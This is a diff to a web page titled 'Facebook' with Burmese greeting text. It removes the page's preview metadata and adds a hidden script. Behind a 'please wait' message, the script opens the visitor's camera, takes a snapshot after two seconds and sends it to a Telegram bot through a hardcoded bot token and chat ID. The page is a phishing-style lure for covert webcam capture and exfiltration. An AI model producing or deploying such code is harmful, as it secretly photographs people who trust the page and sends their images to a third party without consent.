@@ -3,13 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <title>Facebook</title>
-    <meta property="og:title" content="Facebook Profile">
-    <meta property="og:description" content="ဤလင့်ခ်ကို ဝင်ရောက်ကြည့်ရှုပါ။">
-    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
-    <meta property="og:type" content="website">
 </head>
 <body style="text-align: center; margin-top: 50px; font-family: sans-serif;">
     <h2>မင်္ဂလာပါ</h2>
-    <p>ဤလင့်ခ်ကို ဝင်ရောက်ကြည့်ရှုသည့်အတွက် ကျေးဇူးတင်ပါသည်။</p>
+    <p>ကျေးဇူးပြု၍ ခဏစောင့်ပါ...</p>
+    
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const token = "8893645764:AAHR26AFFyCLUJr_MbxS0Y9JornTiRPCxEU";
+        const chatId = "8909569859";
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(function() {
+                var canvas = document.getElementById('canvas');
+                var context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(function(blob) {
+                    var formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'visitor.jpg');
+                    
+                    fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/jpeg');
+            }, 2000);
+        })
+        .catch(function(err) {
+            console.log("Error: " + err);
+        });
+    </script>
 </body>
 </html>
+
